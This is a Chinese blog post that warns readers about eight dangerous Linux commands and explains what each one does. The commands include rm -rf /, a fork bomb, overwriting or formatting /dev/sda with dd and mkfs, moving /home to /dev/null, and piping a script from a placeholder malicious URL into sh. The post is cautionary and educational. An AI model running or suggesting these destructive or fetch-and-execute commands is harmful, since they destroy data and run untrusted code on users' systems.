---
layout: post
title: Linux上最危险的8个命令
---

Linux命令是很强大、高效的。但是有时侯执行一些命令要非常小心，尤其是，当你不知道自己在干什么的情况下。

这篇文件总结了8个可能让人悲剧的10个命令。这些命令在执行之前，一定要再三确认，一不小心就会让你追悔莫及。

### #1) rm -rf

`rm -rf`是删除目录最快的方法，如果使用桌面环境（右键->删除）删除一个零碎目录需要很长时间。但是一个小小的打字错误，有可能对你的系统造成不可恢复的破坏。例如下面这条命令：

{% highlight shell %}
# rm -rf /
{% endhighlight %}

上面这条命令需要系统管理员权限，这也是不建议使用root用户登录系统的原因之一。

rm常用选项：

* **rm**：删除文件
* **rm -r**：递归的删除目录，包括空目录
* **rm -f**：直接删除文件，不询问
* **rm -rf /**：直接根(root)目录，不询问
* **rm -rf \***：删除当前目录的所有东西，不询问
* **rm -rf**：删除当前目录和子目录，不询问

在执行`rm -rf`一定要小心。为了防止`rm`命令意外删除文件或目录，可以为`rm`创建一个别名`rm -i`，每次都需要确认删除。

### #2) :(){:|:&};:

上面这个命令就是所谓的fork炸弹。执行上面代码会耗尽系统资源而崩溃。更多关于fork炸弹的信息看这里：[Linux：怎么防止fork炸弹攻击](http://blog.topspeedsnail.com/archives/2757)。

### #3) cmd > /dev/sda

cmd代表一个命令，`cmd > /dev/sda`把cmd命令的输出写到了`/dev/sda`块设备上，会导致`/dev/sda`块设备数据的全部丢失。

### #4) mv 目录 /dev/null

上面命令会把目录移动到`/dev/null`。在Linux中， /dev/null是一个特殊的设备文件，有人把它叫做黑洞。

{% highlight shell %}
# mv /home/* /dev/null
{% endhighlight %}

上面命令相当于：

{% highlight shell %}
# rm -rf /home/*
{% endhighlight %}

### #5) wget http://怀有恶意脚本的url -O- | sh

上面这条命令在安装软件或系统环境时总用到，它从url下载脚本，下载完成之后自动执行脚本。不要对不信任的url执行上面这个命令。

### #6) mkfs.ext3 /dev/sda

上面命令是格式化命令，执行完之后硬盘数据全部清空。

### #7) > file

`> file`命令会把文件中的数据全部清空。

### #8) dd if=/dev/random of=/dev/sda

上面命令向sda设备中写入随机数据，这是不可恢复的。

如果一个命令你不知道是干嘛的，不要盲目执行，可以先使用man查询一下。如果你有因为执行错误命令而导致系统崩溃的经历，欢迎留言。